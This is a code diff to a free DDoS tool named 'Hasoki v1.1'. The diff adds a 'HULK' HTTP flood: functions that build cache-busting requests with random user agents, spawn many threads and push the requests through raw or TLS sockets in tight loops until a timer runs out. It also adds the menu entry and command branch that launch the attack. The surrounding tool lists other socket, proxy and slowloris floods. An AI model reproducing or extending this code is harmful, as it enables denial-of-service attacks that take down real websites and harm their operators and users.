@@ -2,15 +2,12 @@
 # From NV with love
 # Hasoki v1.1
 # All for FREE
-from socket
 from os import system, name
 import httpx
 import undetected_chromedriver as webdriver
 from httpx import AsyncClient, Headers
 import os, threading, requests, cloudscraper, datetime, time, socket, socks, ssl, random, socket
-from socket import (AF_INET, IP_HDRINCL, IPPROTO_IP, IPPROTO_TCP, IPPROTO_UDP, SOCK_DGRAM,
-                    SOCK_RAW, SOCK_STREAM, TCP_NODELAY, gethostbyname,
-                    gethostname, socket)
+import socket
 from urllib.parse import urlparse
 from requests.cookies import RequestsCookieJar
 import undetected_chromedriver as webdriver
@@ -511,7 +508,42 @@ def AttackSOC(target, until_datetime, req):
                 s.close()
         except:
             pass
-#endregion
+#hulk
+def LaunchHULK(url, th, t):
+    target = get_target(url)
+    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
+    m = random.choice(method)
+    user_agent = random.choice(useragents)
+    req =  m +target['uri']+"?"+ str(random.randint(1,1000))+"="+str(random.randint(1,1000))+" HTTP/1.1\r\nHost: " + target['host'] + "\r\n"
+    req += user_agent +"\r\n"
+    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
+    req += "Connection: Keep-Alive\r\nCache-Control: no-cache\r\n\r\n"
+    for _ in range(int(th)):
+        try:
+            thd = threading.Thread(target=AttackHULK, args=(target, until, req))
+            thd.start()
+        except:
+            pass
+
+def AttackHULK(target, until_datetime, req):
+    if target['scheme'] == 'https':
+        s = socks.socksocket()
+        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+        s.connect((str(target['host']), int(target['port'])))
+        s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
+    else:
+        s = socks.socksocket()
+        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+        s.connect((str(target['host']), int(target['port'])))
+    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
+        try:
+            try:
+                for _ in range(100):
+                    s.send(str.encode(req))
+            except:
+                s.close()
+        except:
+            pass
 
 #region CFB
 def LaunchCFB(url, th, t):
@@ -986,6 +1018,7 @@ def layer7():
     stdout.write("             "+Fore.LIGHTGREEN_EX            +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"spoof "+Fore.LIGHTGREEN_EX+"   |"+Fore.LIGHTWHITE_EX+" HTTP Spoof Socket Attack                  "+Fore.LIGHTGREEN_EX+"║\n")
 
     stdout.write("             "+Fore.LIGHTGREEN_EX            +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"soc   "+Fore.LIGHTGREEN_EX+"   |"+Fore.LIGHTWHITE_EX+" Socket Attack                             "+Fore.LIGHTGREEN_EX+"║\n")
+    stdout.write("             "+Fore.LIGHTGREEN_EX            +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"hulk  "+Fore.LIGHTGREEN_EX+"   |"+Fore.LIGHTWHITE_EX+" Hulk DoS tool                             "+Fore.LIGHTGREEN_EX+"║\n")
     stdout.write("             "+Fore.LIGHTGREEN_EX            +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"pxraw "+Fore.LIGHTGREEN_EX+"   |"+Fore.LIGHTWHITE_EX+" Proxy Request Attack                      "+Fore.LIGHTGREEN_EX+"║\n")
     stdout.write("             "+Fore.LIGHTGREEN_EX            +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"pxsoc "+Fore.LIGHTGREEN_EX+"   |"+Fore.LIGHTWHITE_EX+" Proxy Socket Attack                       "+Fore.LIGHTGREEN_EX+"║\n")
     stdout.write("             "+Fore.LIGHTGREEN_EX            +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"pxslow"+Fore.LIGHTGREEN_EX+"   |"+Fore.LIGHTWHITE_EX+" Proxy Slowloris attack                    "+Fore.LIGHTGREEN_EX+"║\n")
@@ -1109,6 +1142,12 @@ def command():
         timer = threading.Thread(target=countdown, args=(t,))
         timer.start()
         LaunchSOC(target, thread, t)
+        timer.join()
+    elif command == "hulk" or command == "HULK":
+        target, thread, t = get_info_l7()
+        timer = threading.Thread(target=countdown, args=(t,))
+        timer.start()
+        LaunchHULK(target, thread, t)
         timer.join()
     elif command == "pxsoc" or command == "PXSOC":
         if get_proxies():
